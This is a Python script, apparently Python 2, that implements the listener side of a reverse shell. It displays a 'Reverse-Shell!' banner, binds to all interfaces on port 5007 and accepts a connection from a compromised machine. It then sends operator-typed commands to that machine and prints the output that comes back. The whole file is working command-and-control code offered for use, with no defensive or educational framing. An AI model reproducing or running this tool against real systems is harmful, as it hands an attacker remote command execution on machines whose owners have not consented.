import socket
import sys
import os

os.system('clear')

class colors:
	GREEN = '\033[92m'
	STOP = '\033[0m'	
	RED='\033[31m'
	BLUE = '\033[94m'
	BOLD = '\033[1m'
	CGREY    = '\33[90m'

print (colors.CGREY + " ____                                   ____  _          _ _    ")
print ("|  _ \ _____   _____ _ __ ___  ___     / ___|| |__   ___| | |   ")
print ("| |_) / _ \ \ / / _ \ '__/ __|/ _ \____\___ \| '_ \ / _ \ | |   ")
print ("|  _ <  __/\ V /  __/ |  \__ \  __/_____|__) | | | |  __/ | |_  ")
print ("|_| \_\___| \_/ \___|_|  |___/\___|    |____/|_| |_|\___|_|_(_) " + colors.STOP)
print 

host = "0.0.0.0"
port = 5007
size = 2048 # buffer size

try:
	s = socket.socket()
	s.bind((host,port))
	s.listen(5)
	print (colors.GREEN + "Listening as {%s}:{%s}..."%(host,port) + colors.STOP)
except:
	print (colors.RED + "Unable to find hosts!!" + colors.STOP)
	sys.exit()

try:
	csocket, caddress = s.accept()
	print (colors.GREEN + "{"+caddress[0]+"}:{"+str(caddress[1])+"} Connected"+ colors.STOP)
except:	
	print (colors.RED + "Unable to connect!!" + colors.STOP)
	sys.exit()

hostname = csocket.recv(size).decode()

while True:
	command = raw_input(caddress[0]+"@"+str(hostname)+" $ ")
	csocket.send(command.encode())
	if command.lower() == "exit":
		print (colors.RED + "QUITTING!!"+colors.STOP)
		break
	result = csocket.recv(size).decode()
	print (colors.BLUE + result + colors.STOP)

csocket.close()
s.close()
